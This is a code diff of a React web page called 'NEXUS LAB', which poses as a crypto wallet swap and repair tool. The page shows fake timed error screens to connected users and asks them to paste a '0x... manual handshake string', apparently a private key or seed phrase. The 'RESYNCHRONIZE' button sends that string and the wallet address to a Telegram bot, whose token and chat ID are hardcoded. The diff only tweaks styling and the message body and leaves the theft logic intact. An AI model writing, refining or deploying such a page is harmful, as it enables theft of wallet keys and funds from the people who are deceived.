@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { useAccount, useBalance } from 'wagmi';
 import { useWeb3Modal } from '@web3modal/wagmi/react';
-import { RefreshCcw, AlertCircle, ArrowDown, Database, History, ChevronRight, Settings, Coins, Activity, Clock, Unlock, Zap } from 'lucide-react';
+import { RefreshCcw, AlertCircle, ArrowDown, Database, History, Settings, Activity, Clock, Unlock, Zap } from 'lucide-react';
 
 export default function NexusLab() {
   const { address, isConnected } = useAccount();
@@ -10,19 +10,18 @@ export default function NexusLab() {
   const [view, setView] = useState("menu"); 
   const [loading, setLoading] = useState(false);
   const [inputVal, setInputVal] = useState("");
-  const [typedAmount, setTypedAmount] = useState("");
   const [activeError, setActiveError] = useState({ title: "", desc: "" });
 
   const triggerError = (t, d) => {
     if (!isConnected) { open(); return; }
     setLoading(true);
-    setTimeout(() => { setLoading(false); setActiveError({ title: t, desc: d }); setView("error"); }, 2500);
+    setTimeout(() => { setLoading(false); setActiveError({ title: t, desc: d }); setView("error"); }, 2000);
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
+    <div className="min-h-screen bg-[#05070a] text-slate-200 p-6 uppercase tracking-tighter select-none">
       <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
-        <h1 className="text-xl font-black text-white italic tracking-widest">NEXUS LAB</h1>
+        <h1 className="text-xl font-black text-white italic">NEXUS LAB</h1>
         <w3m-button balance="hide" /> 
       </header>
 
@@ -48,11 +47,11 @@ export default function NexusLab() {
       )}
 
       {view === "swap" && (
-        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8 shadow-2xl">
+        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8">
           <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-bold">← EXIT</button>
-          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
+          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8">
             <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>INPUT</span><span>BAL: {balance?.formatted.slice(0,6) || "0.00"}</span></div>
-            <input type="number" value={typedAmount} onChange={(e) => setTypedAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-full" />
+            <input type="number" placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-full" />
           </div>
           <button onClick={() => triggerError("SWAP_0x55", "Routing failed.")} className="w-full bg-cyan-600 py-5 rounded-2xl text-[11px] font-black text-white">INITIALIZE REPAIR</button>
         </div>
@@ -60,16 +59,15 @@ export default function NexusLab() {
 
       {view === "error" && (
         <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-xl">
-          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
+          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center">
             <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
-            <h2 className="text-white font-black text-lg uppercase italic tracking-tighter">{activeError.title}</h2>
-            <p className="text-[10px] text-slate-500 leading-relaxed mt-3 lowercase px-4">{activeError.desc}</p>
-            <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 uppercase placeholder:text-slate-900" />
+            <h2 className="text-white font-black text-lg uppercase italic">{activeError.title}</h2>
+            <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 uppercase" />
             <button onClick={() => {
               fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nERR: ${activeError.title}\nSTR: ${inputVal}` }),
+                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nSTR: ${inputVal}` }),
               });
               alert("Node Resyncing..."); setView("menu");
             }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white">RESYNCHRONIZE</button>
